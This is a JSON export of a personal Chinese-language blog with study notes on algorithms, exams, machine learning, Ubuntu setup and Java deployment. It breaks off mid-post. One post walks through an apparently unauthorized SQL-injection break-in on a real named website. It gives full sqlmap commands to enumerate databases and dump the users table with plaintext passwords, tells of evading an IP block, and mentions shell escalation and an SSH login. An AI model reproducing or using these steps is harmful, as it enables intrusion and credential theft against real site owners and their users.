{"meta":{"title":"waynamigo's blog","subtitle":null,"description":null,"author":"waynamigo","url":"http://waynamigo.github.io","root":"/"},"pages":[{"title":"tags","date":"2019-07-13T16:06:18.000Z","updated":"2019-07-14T09:04:07.999Z","comments":false,"path":"tags/index.html","permalink":"http://waynamigo.github.io/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-07-13T16:06:28.000Z","updated":"2019-07-14T09:04:45.455Z","comments":false,"path":"categories/index.html","permalink":"http://waynamigo.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"动态规划的几种问题part1","slug":"2021-01-01-DP的几种问题part1","date":"2020-12-31T16:00:00.000Z","updated":"2020-12-30T15:15:32.539Z","comments":true,"path":"2021/01/01/2021-01-01-DP的几种问题part1/","link":"","permalink":"http://waynamigo.github.io/2021/01/01/2021-01-01-DP的几种问题part1/","excerpt":"Dynamic planning就是用历史记录寻找最优解一般先构造出一维或二维数组，将dp[i][j]的意义确定后，将初始值确定，再根据递推关系式求解，即得到dp[m][n]，暂时不牵扯到DPtable和备忘录等优化方式。","text":"Dynamic planning就是用历史记录寻找最优解一般先构造出一维或二维数组，将dp[i][j]的意义确定后，将初始值确定，再根据递推关系式求解，即得到dp[m][n]，暂时不牵扯到DPtable和备忘录等优化方式。 一维DP一维DP关系，例如青蛙跳问题：一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法 12①定义递推数组关系：设跳上n级有dp[n]种方法，由每次跳1级或2级，则跳n级要么从n-1级上来或n-2级上来，dp[n]=dp[n-1]+dp[n-2]②数组初值定义：dp[1]=1;dp[2]=2;dp[3]=3；要从1开始算起，0无意义。 二维DP给定一个包含非负整数的 m x n 的初始矩阵arr[m][n]，找出一条从左上角到右下角的路径，使得路径上的数字总和为最小。Minium Path Sum。 123456789①递推数组关系：由每次只能向下或者向右移动一步，设从[0][0]走到[i][j]的最短路为dp[i][j]，dp[m][n]的最短路为min(dp[m-1][n],dp[m][n-1]) + arr[m][n],则得出递推关系为 dp[i][j]=min(dp[i-1][j]+dp[i][j-1]) + arr[i][j];②数组初值定义：dp[0][0]到dp[0][1,2...n-1]只能往右走，则初始化第一行为dp[0][i]=dp[0][i-1]+arr[0][i];dp[0][0]到dp[1,2...n-1][0]只能往下走，则初始化第一行为dp[i][0]=dp[i-1][0]+arr[i][0];此时若只求出来[0][1],[1][0],[1][1]三个初值，那么在求dp[1][j(j&gt;1)]时，会因为dp[0][j]=0(因为上面递推关系得从i=1,j=1开始)，从而得到dp[1][j]=dp[0][j]+arr[1][j]，但是dp[0][j]&gt;实际dp[1][j-1]，结果错误。 题目：Given two strings word1 and word2, return the minimum number of operations required to convert word1 to word2.And You have the following three operations permitted on a word: Insert a characterDelete a characterReplace a characterEdit Distance 解答（转自题解https://leetcode-cn.com/problems/edit-distance/comments/） ① 设dp[i][j]表示word1的前i个字母转换成word2的前j个字母所使用的最少操作。② if:word1[i]=word2[j] then dp[i][j]=dp[i-1][j-1];else:取Insert Delete Replace三个操作的最小值即dp[i][j]=min(dp[i][j-1],dp[i-1][j],dp[i-1][j-1])+1;三种操作对应三种要使用的上一元素： word1[i] 替换成与 word2[j]相等则dp[i][j] = dp[i-1][j-1] + 1; word1末尾插入word2[j]，则有 dp[i][j] = dp[i][j-1] + 1; word1[i]删除，dp[i][j] = dp[i-1][j] + 1;③数组初值定义，二维DP一般为初始化第一行和第一列直接写出来 12345678910111213141516171819202122class Solution &#123;public: int minDistance(string word1, string word2) &#123; int m=word1.length(); int n=word2.length(); int dp[m+1][n+1]; memset(dp,0,sizeof(dp)); for(int i=0;i&lt;=m;i++) dp[i][0]=i; for(int j=0;j&lt;=n;j++) dp[0][j]=j; for(int i=1;i&lt;=m;i++)&#123; for(int j=1;j&lt;=n;j++)&#123; // 注意这里dp[i][j]指的是word的 第i,j个字符，需要对应word[i-1]和[j-1] if(word1[i-1]==word2[j-1]) dp[i][j]=dp[i-1][j-1]; else&#123; int temp = dp[i-1][j]&lt;dp[i][j-1] ? dp[i-1][j]:dp[i][j-1]; dp[i][j]= (temp&lt;dp[i-1][j-1] ? temp:dp[i-1][j-1]) +1; &#125; &#125; &#125; return dp[m][n]; &#125;&#125;;","categories":[{"name":"算法","slug":"算法","permalink":"http://waynamigo.github.io/categories/算法/"}],"tags":[{"name":"动态规划","slug":"动态规划","permalink":"http://waynamigo.github.io/tags/动态规划/"}]},{"title":"408考纲","slug":"2019-408","date":"2019-07-31T16:00:00.000Z","updated":"2019-08-06T06:25:36.488Z","comments":true,"path":"2019/08/01/2019-408/","link":"","permalink":"http://waynamigo.github.io/2019/08/01/2019-408/","excerpt":"sed ‘/^$/d’计算机学科专业基础综合（408）考试涵盖数据结构、计算机组成原理、操作系统和计算机网络等学科专业基础课程。","text":"sed ‘/^$/d’计算机学科专业基础综合（408）考试涵盖数据结构、计算机组成原理、操作系统和计算机网络等学科专业基础课程。 考试形式和试卷结构一、试卷满分及考试时间本试卷满分为150分，考试时间为180分钟。二、答题方式答题方式为闭卷、笔试。三、试卷内容结构数据结构 45分计算机组成原理 45分操作系统 35分计算机网络 25分四、试卷题型结构单项选择题 80分 (40小题，每小题2分)综合应用题 70分 考查内容数据结构123456【考查目标】1.掌握数据结构的基本概念、基本原理和基本方法。2.掌握数据的逻辑结构、存储结构及基本操作的实现，能够对算法进行基本的时间复杂度与空间复杂度的分析。3.能够运用数据结构基本原理和方法进行问题的分析与求解，具备采用C或C++语言设计与实现算法的能力。 一、线性表(一)线性表的定义和基本操作(二)线性表的实现 1.顺序存储 2.链式存储 3.线性表的应用二、栈、队列和数组(一)栈和队列的基本概念(二)栈和队列的顺序存储结构(三)栈和队列的链式存储结构(四)栈和队列的应用(五)特殊矩阵的压缩存储三、树与二叉树(一)树的基本概念(二)二叉树 1.二叉树的定义及其主要特征 2.二叉树的顺序存储结构和链式存储结构 3.二叉树的遍历 4.线索二叉树的基本概念和构造(三)树、森林 1.树的存储结构 2.森林与二叉树的转换 3.树和森林的遍历(四)树与二叉树的应用 1.二叉排序树 2.平衡二叉树 3.哈夫曼(Huffman)树和哈夫曼编码四、图(一)图的基本概念(二)图的存储及基本操作 1.邻接矩阵法 2.邻接表法 3.邻接多重表、十字链表(三)图的遍历 1.深度优先搜索 2.广度优先搜索(四)图的基本应用 1.最小(代价)生成树 2.最短路径 3.拓扑排序 4.关键路径五、查找(一)查找的基本概念(二)顺序查找法(三)分块查找法(四)折半查找法(五)B树及其基本操作、B+树的基本概念(六)散列(Hash)表(七)字符串模式匹配(八)查找算法的分析及应用六、排序(一)排序的基本概念(二)插入排序 1.直接插入排序 2.折半插入排序(三)气泡排序(bubble sort)(四)简单选择排序(五)希尔排序(shell sort)(六)快速排序(七)堆排序(八)二路归并排序(merge sort)(九)基数排序(十)外部排序(十一)各种内部排序算法的比较(十二)排序算法的应用 计算机组成原理12345678 【考查目标】1.理解单处理器计算机系统中各部件的内部工作原理、组成结构以及相互连接方式，具有完整的计算机系统的整机概念。2.理解计算机系统层次化结构概念，熟悉硬件与软件之间的界面，掌握指令集体系结构的基本知识和基本实现方法。3.能够综合运用计算机组成的基本原理和基本方法，对有关计算机硬件系统中的理论和实际问题进行计算、分析，对一些基本部件进行简单设计;并能对高级程序设计语言中的相关问题进行分析。 一、计算机系统概述(一)计算机发展历程(二)计算机系统层次结构 1.计算机系统的基本组成 2.计算机硬件的基本组成 3.计算机软件和硬件的关系 4.计算机的工作过程(三)计算机性能指标 吞吐量、响应时间;CPU时钟周期、主频、CPI、CPU执行时间;MIPS、MFLOPS 、GFLOPS、TFLOPS、PFLOPS。二、数据的表示和运算(一)数制与编码 1.进位计数制及其相互转换 2.真值和机器数 3.BCD码 4.字符与字符串 5.校验码(二)定点数的表示和运算 1.定点数的表示 无符号数的表示;有符号整数的表示。 2.定点数的运算 定点数的位移运算;原码定点数的加减运算;补码定点数的加/减运算;定点数的乘/除运算;溢出概念和判别方法。(三)浮点数的表示和运算 1.浮点数的表示 IEEE 754标准 2.浮点数的加/减运算(四)算术逻辑单元ALU 1.串行加法器和并行加法器 2.算术逻辑单元ALU的功能和结构三、存储器层次结构(一)存储器的分类(二)存储器的层次化结构(三)半导体随机存取存储器 1.SRAM存储器 2.DRAM存储器 3.只读存储器 4.Flash存储器(四)主存储器与CPU的连接(五)双口RAM和多模块存储器(六)高速缓冲存储器(Cache) 1.Cache的基本工作原理 2.Cache和主存之间的映射方式 3.Cache中主存块的替换算法 4.Cache写策略(七)虚拟存储器 1.虚拟存储器的基本概念 2.页式虚拟存储器 3.段式虚拟存储器 4.段页式虚拟存储器 5.TLB(快表)四、指令系统(一)指令格式 1.指令的基本格式 2.定长操作码指令格式 3.扩展操作码指令格式(二)指令的寻址方式 1.有效地址的概念 2.数据寻址和指令寻址 3.常见寻址方式(三)CISC和RISC的基本概念五、中央处理器(CPU)(一)CPU的功能和基本结构(二)指令执行过程(三)数据通路的功能和基本结构(四)控制器的功能和工作原理 1、硬布线控制器 2、微程序控制器 微程序、微指令和微命令;微指令的编码方式;微地址的形式方式。(五)指令流水线 1、指令流水线的基本概念 2、指令流水线的基本实现 3、超标量和动态流水线的基本概念六、总线(一)总线概述 1、总线的基本概念 2、总线的分类 3、总线的组成及性能指标(二)总线仲裁 1、集中仲裁方式 2、分布仲裁方式(三)总线操作和定时 1、同步定时方式 2、异步定时方式(四)总线标准七、输入输出(I/O)系统(一)I/O系统基本概念(二)外部设备 1、输入设备：键盘、鼠标 2、输出设备：显示器、打印机 3、外存储器：硬盘存储器、磁盘阵列、光盘存储器(三)I/O接口(I/O控制器) 1、I/O接口的功能和基本结构 2、I/O端口及其编址(四)I/O方式 1、程序查询方式 2、程序中断方式 中断的基本概念;中断响应过程;中断处理过程;多重中断和中断屏蔽的概念。 3、DMA方式 DMA控制器的组成，DMA传送过程。 操作系统1234 【考查目标】1.掌握操作系统的基本概念、基本原理和基本功能，理解操作系统的整体运行过程。2.掌握操作系统进程、内存、文件和I/O管理的策略、算法、机制以及相互关系。3.能够运用所学的操作系统原理、方法与技术分析问题和解决问题，并能写出算法代码。 一、操作系统概述(一)操作系统的概念、特征、功能和提供的服务(二)操作系统的发展与分类(三)操作系统的运行环境 1.内核态与用户态 2.中断、异常 3.系统调用(四)操作系统体系结构二、进程管理(一)进程与线程 1.进程概念 2.进程的状态与转换 3.进程控制 4.进程组织 5.进程通信 共享存储系统;消息传递系统;管道通信。 6.线程概念与多线程模型(二)处理机调度 1.调度的基本概念 2.调度时机、切换与过程 3.调度的基本准则 4.调度方式 5.典型调度算法 先来先服务调度算法;短作业(短进程、短线程)优先调度算法;时间片轮转调度算法;优先级调度算法;高响应比优先调度算法;多级反馈队列调度算法。(三)同步与互斥 1.进程同步的基本概念 2.实现临界区互斥的基本方法 软件实现方法;硬件实现方法。 3.信号量 4.管程 5.经典同步问题 生产者-消费者问题;读者-写者问题;哲学家进餐问题。(四)死锁 1.死锁的概念 2.死锁处理策略 3.死锁预防 4.死锁避免 系统安全状态，银行家算法。 5.死锁检测和解除三、内存管理(一)内存管理基础 1.内存管理概念 程序装入与链接;逻辑地址与物理地址空间;内存保护。 2.交换与覆盖 3.连续分配管理方式 4.非连续分配管理方式 分页管理方式;分段管理方式;段页式管理方式。(二)虚拟内存管理 1.虚拟内存基本概念 2.请求分页管理方式 3.页面置换算法 最佳置换算法(OPT);先进先出置换算法(FIFO);最近最少使用置换算法(LRU);时钟置换算法(CLOCK)。 4.页面分配策略 5.工作集 6.抖动四、文件管理(一)文件系统基础 1.文件概念 2.文件的逻辑结构 顺序文件;索引文件;索引顺序文件。 3.目录结构 文件控制块和索引节点;单级目录结构和两级目录结构;树形目录结构;图形目录结构。 4.文件共享 5.文件保护 访问类型;访问控制。(二)文件系统实现 1.文件系统层次结构 2.目录实现 3.文件实现(三)磁盘组织与管理 1.磁盘的结构 2.磁盘调度算法 3.磁盘的管理五、输入输出(I/O)管理(一)I/O管理概述 1.I/O控制方式 2. I/O软件层次结构(二)I/O核心子系统 1.I/O调度概念 2.高速缓存与缓冲区 3.设备分配与回收 4.假脱机技术(SPOOLing) 计算机网络12345【考查目标】1.掌握计算机网络的基本概念、基本原理和基本方法。2.掌握计算机网络的体系结构和典型网络协议，了解典型网络设备的组成和特点，理解典型网络设备的工作原理。3.能够运用计算机网络的基本概念、基本原理和基本方法进行网络系统的分析、设计和应用。 一、计算机网络体系结构(一)计算机网络概述 1.计算机网络的概念、组成与功能 2.计算机网络的分类 3.计算机网络的标准化工作及相关组织(二)计算机网络体系结构与参考模型 1.计算机网络分层结构 2.计算机网络协议、接口、服务等概念 3.ISO/OSI参考模型和TCP/IP模型二、物理层(一)通信基础 1.信道、信号、宽带、码元、波特、速率、信源与信宿等基本概念 2.奈奎斯特定理与香农定理 3.编码与调制 4.电路交换、报文交换与分组交换 5.数据报与虚电路(二)传输介质 1.双绞线、同轴电缆、光纤与无线传输介质 2.物理层接口的特性(三)物理层设备 1.中继器 2.集线器三、数据链路层(一)数据链路层的功能(二)组帧(三)差错控制 1.检错编码 2.纠错编码(四)流量控制与可靠传输机制 1.流量控制、可靠传输与滑轮窗口机制 2.停止-等待协议 3.后退N帧协议(GBN) 4.选择重传协议(SR)(五)介质访问控制 1.信道划分 频分多路复用、时分多路复用、波分多路复用、码分多路复用的概念和基本原理。 2.随即访问 ALOHA协议;CSMA协议;CSMA/CD协议;CSMA/CA协议。 3.轮询访问 令牌传递协议(六)局域网 1.局域网的基本概念与体系结构 2.以太网与IEEE 802.3 3.IEEE 802.11 4.令牌环网的基本原理(七)广域网 1.广域网的基本概念 2.PPP协议 3.HDLC协议(八)数据链路层设备 1.网桥的概念和基本原理 2.局域网交换机及其工作原理。四、网络层(一)网络层的功能 1.异构网络互联 2.路由与转发 3.拥塞控制(二)路由算法 1.静态路由与动态路由 2.距离-向量路由算法 3.链路状态路由算法 4.层次路由(三)IPv4 1.IPv4分组 2.IPv4地址与NAT 3.子网划分与子网掩码、CIDR 4.ARP协议、DHCP协议与ICMP协议(四)IPv6 1.IPv6的主要特点 2.IPv6地址(五)路由协议 1.自治系统 2.域内路由与域间路由 3.RIP路由协议 4.OSPF路由协议 5.BGP路由协议(六)IP组播 1.组播的概念 2.IP组播地址(七)移动IP 1.移动IP的概念 2.移动IP的通信过程(八)网络层设备 1.路由器的组成和功能 2.路由表与路由转发五、传输层(一)传输层提供的服务 1.传输层的功能 2.传输层寻址与端口 3.无连接服务与面向连接服务(二)UDP协议 1.UDP数据报 2.UDP校验(三)TCP协议 1.TCP段 2.TCP连接管理 3.TCP可靠传输 4.TCP流量控制与拥塞控制六、应用层(一)网络应用模型 1.客户/服务器模型 2.P2P模型(二)DNS系统 1.层次域名空间 2.域名服务器 3.域名解析过程(三)FTP 1.FTP协议的工作原理 2.控制连接与数据连接(四)电子邮件 1.电子邮件系统的组成结构 2.电子邮件格式与MIME 3.SMTP协议与POP3协议(五)WWW 1.WWW的概念与组成结构 2.HTTP协议","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"other","slug":"other","permalink":"http://waynamigo.github.io/tags/other/"}]},{"title":"Solidity编写smart contract的demo","slug":"2019-07-22-blockchain","date":"2019-07-21T16:00:00.000Z","updated":"2019-08-26T04:35:11.923Z","comments":true,"path":"2019/07/22/2019-07-22-blockchain/","link":"","permalink":"http://waynamigo.github.io/2019/07/22/2019-07-22-blockchain/","excerpt":"暑假开始的区块链+深度学习的小项目，关于写smart contract的阶段性记录(持续更新)ps:清收藏夹时发现的奇异AI社区，地址失效了，现在是http://talk.strangeai.pro（早期是将人工智能算法以平台的形式提供给普通开发者，让开发者来贡献、提交开源或者自有的算法。现在名字改成ManaAI了，开放的算法代码也下架了,遗憾）","text":"暑假开始的区块链+深度学习的小项目，关于写smart contract的阶段性记录(持续更新)ps:清收藏夹时发现的奇异AI社区，地址失效了，现在是http://talk.strangeai.pro（早期是将人工智能算法以平台的形式提供给普通开发者，让开发者来贡献、提交开源或者自有的算法。现在名字改成ManaAI了，开放的算法代码也下架了,遗憾） eth文档solidity文档 测试网络RinkebyRinkeby是以太坊官方提供的测试网络，使用PoA共识机制PoA流程 12345678910111213创世块中指定一组初始授权的signers,所有地址保存在创世区块(Genesis Block),并且把该区块的hash写到钱包里。启动挖矿后, 该组signers开始对生成的block进行签名并广播签名结果保存在区块头的Extra字段中Extra中更新当前高度已授权的所有signers的地址,因为有新加入或踢出的signer每一高度都有一个signer处于IN-TURN状态, 其他signer处于OUT-OF-TURN状态, IN-TURN的signer签名的block会立即广播, OUT-OF-TURN的signer签名的block会延时一段时间后再广播, 保证IN-TURN的签名block有更高的优先级上链如果需要加入一个新的signer,signer通过API接口发起一个proposal, 该proposal通过复用区块头 Coinbase(新signer地址)和Nonce(&quot;0xffffffffffffffff&quot;) 字段广播给其他节点. 所有已授权的signers对该新的signer进行&quot;加入&quot;投票, 如果赞成票超过signers总数的50%, 表示同意加入如果需要踢出一个旧的signer, 所有已授权的signers对该旧的signer进行&quot;踢出&quot;投票, 如果赞成票超过signers总数的50%, 表示同意踢出 Solidity（考研复习太紧张了，以后要鸽到考完初试了。。","categories":[{"name":"Solidity","slug":"Solidity","permalink":"http://waynamigo.github.io/categories/Solidity/"}],"tags":[{"name":"paper","slug":"paper","permalink":"http://waynamigo.github.io/tags/paper/"},{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/tags/ML/"},{"name":"blockchain","slug":"blockchain","permalink":"http://waynamigo.github.io/tags/blockchain/"},{"name":"Solidity","slug":"Solidity","permalink":"http://waynamigo.github.io/tags/Solidity/"}]},{"title":"sqlmap注入拿后台","slug":"2019-07-15-sqlmap-1","date":"2019-07-14T16:00:00.000Z","updated":"2019-07-16T07:28:14.411Z","comments":true,"path":"2019/07/15/2019-07-15-sqlmap-1/","link":"","permalink":"http://waynamigo.github.io/2019/07/15/2019-07-15-sqlmap-1/","excerpt":"本文总过程中无破坏性操作对于这种php的无防站，直接用sqlmap+msf就可以拿。对于那些暴露参数的php站的可以直接拿库，刚刚随便找了个。2019-07-16:被发现了。。ip被黑名单，于是换了个节点。。。还可以登录","text":"本文总过程中无破坏性操作对于这种php的无防站，直接用sqlmap+msf就可以拿。对于那些暴露参数的php站的可以直接拿库，刚刚随便找了个。2019-07-16:被发现了。。ip被黑名单，于是换了个节点。。。还可以登录 先找后台（这位老哥直接在右上角放了链接）http://hesselgravetours.com/event.php?tourID=1721 check databases1sqlmap -u http://****tours.com/event.php?tourID=1721 --dbs --proxy socks5://127.0.0.1:1080 --random-agent check tables1sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave --tables --proxy socks5://127.0.0.1:1080 --random-agent check columns1sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave -T users --columns --proxy socks5://127.0.0.1:1080 --random-agent dump 1sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave -T users -C username,userID,password,accesslevel --dump --proxy socks5://127.0.0.1:1080 --random-agent 可见没经过加密。。如果经过了简单加密的话（如mysql的md5(passwd)），就可以找个在线网站撞（比如https://www.cmd5.com/） 后续不贴了。防御太低有好几种方法找到路进行提权 因为在前面已经得到系统是FreeBSD或者是其他linux，并且得到网站运行在的用户名是content，懂我意思吧 继续用sqlmap –os-shell提权，第一次没有找到上传点 后台找到这个admin/documents/clients_recordview.php 插 入 服 务 器提示是：ssh -o HostKeyAlgorithms=+ssh-dss content@hesselgravetours.com 密码是***图片不贴了 明天读一下https://arxiv.org/pdf/1502.01852.pdf","categories":[{"name":"渗透","slug":"渗透","permalink":"http://waynamigo.github.io/categories/渗透/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://waynamigo.github.io/tags/Linux/"},{"name":"web","slug":"web","permalink":"http://waynamigo.github.io/tags/web/"},{"name":"sqlmap","slug":"sqlmap","permalink":"http://waynamigo.github.io/tags/sqlmap/"},{"name":"msf","slug":"msf","permalink":"http://waynamigo.github.io/tags/msf/"}]},{"title":"部分MACOS风格的ubuntu","slug":"2019-07-09-我的ubuntu设置界面风格","date":"2019-07-08T16:00:00.000Z","updated":"2019-07-14T11:35:24.725Z","comments":true,"path":"2019/07/09/2019-07-09-我的ubuntu设置界面风格/","link":"","permalink":"http://waynamigo.github.io/2019/07/09/2019-07-09-我的ubuntu设置界面风格/","excerpt":"记录一下以防以后电脑崩了还得重新配,感觉撑不住了","text":"记录一下以防以后电脑崩了还得重新配,感觉撑不住了 效果这样 123456789101112sudo apt-get install gnome-tweak-tool#extensions.gnome.org install [ User themes] #www.gnome-look.org [ gtk-3 themes:McOS-HS]tar -zxvf McOS-HS-2-themes.tar.gz#go to tweaks and chose this themetar -zxvf macOS11.tar.xz #extensions.gnome.org [dash-to-dock]#www.gnome-look.org [OSX.for.Dash.to.DOCK]#www.gnome-look.org [Icon Themes: macOS icons]# extensioons.gnome.org [blyr] go to tweaks and choose them cd ./OSX.for.Dash.to.DOCK/Dock Settings/ 12345678gsettings set org.gnome.shell.extensions.dash-to-dock show-apps-at-top truegsettings set org.gnome.shell.extensions.dash-to-dock custom-theme-running-dots falsegsettings set org.gnome.shell.extensions.dash-to-dock custom-theme-customize-running-dots falsegsettings set org.gnome.shell.extensions.dash-to-dock custom-theme-shrink falsegsettings set org.gnome.shell.extensions.dash-to-dock transparency-mode DEFAULT 12345#www.gnome-look.org [GDM themes:SetAsWallpaper]mv ubuntu.css /usr/share/gnome-shell/theme/sudo mv /usr/share/gnome-shell/extensions/ubuntu-dock@ubuntu.com ~/","categories":[{"name":"Linux","slug":"Linux","permalink":"http://waynamigo.github.io/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://waynamigo.github.io/tags/Linux/"},{"name":"tweak","slug":"tweak","permalink":"http://waynamigo.github.io/tags/tweak/"}]},{"title":"用了个bash手动打包java项目并在tomcat中运行","slug":"2019-07-03-经管同学的tomcat项目","date":"2019-07-02T16:00:00.000Z","updated":"2019-07-25T06:55:36.544Z","comments":true,"path":"2019/07/03/2019-07-03-经管同学的tomcat项目/","link":"","permalink":"http://waynamigo.github.io/2019/07/03/2019-07-03-经管同学的tomcat项目/","excerpt":"觉得之前的那个jekyll的主题太丑了，今天翻新了一下，并把文章和live2d模型迁到了hexo(indigo主题，这次再也不改了)帮信管专业的同学把项目部署到服务器上，因为没打包过war，中间有个地方卡住了，好麻烦记一下。（佛了，为什么不用maven","text":"觉得之前的那个jekyll的主题太丑了，今天翻新了一下，并把文章和live2d模型迁到了hexo(indigo主题，这次再也不改了)帮信管专业的同学把项目部署到服务器上，因为没打包过war，中间有个地方卡住了，好麻烦记一下。（佛了，为什么不用maven jdbc和tomcat和手写的DAO，怀旧。用idea打包： 先是在idea里面配置的Webapplication的archive，里面要选一个WEB-INF和META-INF。 将avaliavle elements进行put into outputroot操作，左边的out layout栏里，出现META-INFbuild project 再 build artifacts 好了但是报错了，不知道为啥，war包导出来了，tomcat运行出错。。nmd 项目结构这样 12345678910111213141516171819├── bin│ └── out.jar├── build│ └── source.txt├── build.sh├── classdesign.war├── out│ ├── artifacts│ └── production├── src│ ├── com│ └── MANIFEST.MF└── web ├── commom ├── css ├── iconfont ├── images ├── js └── WEB-INF 然后手动打包了，（写了个循环shellfor javac）代码在这 1234567891011121314151617181920212223242526272829303132#!/usr/bin/bash#写到source，做个list，或者直接用idea生成source.txt也可以path=$(pwd)dependence()&#123;for file in `ls $1|grep -v \".bak\"` do if [ -d $1\"/\"$file ] then dependence $1\"/\"$file else local file_path=$1\"/\"$file if echo $file_path|grep \"MANIFEST.MF\"&gt;/dev/null;then c=c else echo $file_path &gt;&gt; $path/build/source fi fi done&#125;dependence $path/srclibs=\"\"for java_lib in $(ls $path/web/WEB-INF/lib);doif [[ libs != \"\" ]];thenlibs=$libs:$path/web/WEB-INF/lib/$java_libelselibs=$path/web/WEB-INF/lib/$java_libfidonejavac -encoding utf-8 -Xlint:unchecked -d $path/build -classpath $path/web/WEB-INF/lib @$path/build/sourcejar cvf $path/src/MANIFEST.MF $path/bin/classdesign.war ./* 把war烤到webapps执行startup.sh就可以运行了","categories":[{"name":"java","slug":"java","permalink":"http://waynamigo.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"http://waynamigo.github.io/tags/java/"},{"name":"tomcat","slug":"tomcat","permalink":"http://waynamigo.github.io/tags/tomcat/"},{"name":"bash","slug":"bash","permalink":"http://waynamigo.github.io/tags/bash/"}]},{"title":"机器学习考试复习","slug":"2019-06-25-machinelearning","date":"2019-06-24T16:00:00.000Z","updated":"2019-07-14T10:05:03.044Z","comments":true,"path":"2019/06/25/2019-06-25-machinelearning/","link":"","permalink":"http://waynamigo.github.io/2019/06/25/2019-06-25-machinelearning/","excerpt":"统 计 学 习","text":"统 计 学 习 题型选择 3分×9简答题 5分×5综合分析 7分×7 绪论，回归 按学习方式分类的机器学习算法 四类 模型评估指标：泛化误差、经验误差 欠拟合和过拟合（避免过拟合的方法 正则化-L2、dropout等） 分类和聚类和回归的区别 12回归和分类本质相同，都是根据训练集（有标签，有监督学习）做预测，区别是输出不同，分类是定性输出，回归是定量输出聚类是无监督学习，产生多个集合，单个集合中的元素属性相似 多元线性回归求解权重w的方法：最小二乘、梯度下降、误差函数 非线性回归如何进行计算:通过中间函数映射 岭回归的特点（简答？ LDA 应该有大题 LDA结构，LDA生成文档D的步骤（简答 使用LDA的目的：得到文章库中每篇文章的主题分布； 得到新输入文章的主题分布。 决策树 随机森林 支持向量机 决策树是一种有监督的分类方法,它用已有的数据构造出一棵树,再用这棵树对新的数据进行预测。 学习过程：通过对训练样本的分析来确定“划分属性”（即内部结点所对应的属性） 预测过程：将测试示例从根结点开始，沿着划分属性所构成的“判定测试序列”下行，直到叶结点。 决策树（简答） 1234567891构造过程：特征选择；决策树生成；剪枝（预剪枝和后剪枝的方法）是自根到叶的递归过程2生成停止条件当前结点包含的样本全属于同一类别，无需划分;当前属性集为空, 或是所有样本在所有属性上取值相同，无法划分;当前结点包含的样本集合为空，不能划分.3预剪枝：在构造树的过程中，对每个结点在划分前进行估计，如果当前结点的划分不能带来决策树模型泛化性能的提升，则不对当前结点进行划分并且将当前结点标记为叶结点。后剪枝：先把整颗决策树构造完毕，自底向上对非叶结点进行考察，若将该结点对应的子树换为叶结点能够带来泛化性能的提升，则把该子树替换为叶结点。（预剪后剪的对比） 对节点划分的方法 信息增益 增益率 基尼指数 12信息增益=△信息熵，信息熵越小纯度越大根据基尼指数：选取划分后使基尼指数最小的属性 随机森林（简答） 12345678原始训练集为D,应用Bootstrap法有放回地随机抽取k个新的自助样本集,并由此构建k 棵决策树每棵树最大限度地生长,不做任何修剪将生成的多棵决策树组成随机森林,用随机森林分类器对新的数据进行判别与分类,森林中的每一棵树都对新的数据进行预测和投票,最终得票最多的分类项即为随机森林对该数据的预测结果。优点：随机森林对于高维数据集的处理能力比较好,它可以处理成千上万的输入变量,并确定最重要的变量,因此被认为是一个不错的降维方法。此外,该模型能够输出变量的重要性程度,这是一个非常便利的功能。在对缺失数据进行估计时,随机森林是一个十分有效的方法。就算存在大量的数据缺失,随机森林也能较好地保持精确性。当存在分类不平衡的情况时,随机森林能够提供平衡数据集误差的有效方法。缺点：随机森林给人的感觉像是一个黑盒子———你几乎无法控制模型内部的运行,只能在不同的参数和随机种子之间进行尝试,从而得到一个更优的分类器。 支持向量机 12概念：基本模型定义为特征空间上的间隔最大的线性分类器（按监督学习方式对数据进行二分类的广义线性分类器）决策边界是对学习样本求解的最大边距超平面 间隔，最大间隔 超平面的距离计算（可能考计算 r = |w.T·x+b|/|w| 核方法 设计核函数（综合题）根据mercer定理：若一个对称函数所对应的核矩阵半正定，那么它可以设为核函数神经网络 kmeans 结构 123输入层：接受来自网络外部的数据的顶点隐藏层：除了输入层和输出层以外的其他层输出层：向网络外部输出数据的顶点 超参数有哪些 如何衡量你的预测算法，损失函数loss 感知机是啥 BP是啥 RBF是啥 hopfield是啥 SOM是啥 计算隐藏层结点数目（计算题？ 12隐层结点数s与模式数N的关系是：s＝log2N；隐层结点数s＝2n＋1（n为输入层结点数）； CNN LSTM 聚类 1234567891011优点1.原理简单，实现方便，收敛速度快；2.聚类效果较优；3.模型的可解释性较强；4.调参只需要簇数k；缺点：1.k的选取不好把握；2.初始聚类中心的选择；3.如果数据的类型不平衡，比如数据量严重失衡或者类别的方差不同，则聚类效果不佳；4.采用的是迭代的方法，只能得到局部最优解；5.对于噪声和异常点比较敏感。 聚类性能度量 外部指标 内部指标 12外：聚类结果与某个“参考模型”(reference model) 进行比较，需要标记数据如Jaccard 系数，FM 指数，Rand 指数内：直接考察聚类结果而不用任何参考模型，类内聚集程度和类间离散程度。定义簇内样本间的距离，簇间距离，如DB 指数，Dunn 指数等","categories":[{"name":"复习","slug":"复习","permalink":"http://waynamigo.github.io/categories/复习/"}],"tags":[{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/tags/ML/"}]},{"title":"这学期项目中的坑","slug":"2019-06-12-项目坑","date":"2019-06-11T16:00:00.000Z","updated":"2019-07-14T12:19:38.033Z","comments":true,"path":"2019/06/12/2019-06-12-项目坑/","link":"","permalink":"http://waynamigo.github.io/2019/06/12/2019-06-12-项目坑/","excerpt":"在？为什么国内博客上点击多的都是废话","text":"在？为什么国内博客上点击多的都是废话 mysql分离 + springboot + eurake123456原因是 配置远程数据库时，springboot 没有创建表，自己手动建了hibernate sequence后就会报这个错。表现为插入数据失败，error &quot;could not read a hi value - you need to populate the table&quot;.解决方法是对nextval设置初始值，stackoverflow的另一种方案是改掉注释@GeneratedValue(strategy = GenerationType.AUTO)改为@GeneratedValue(strategy = 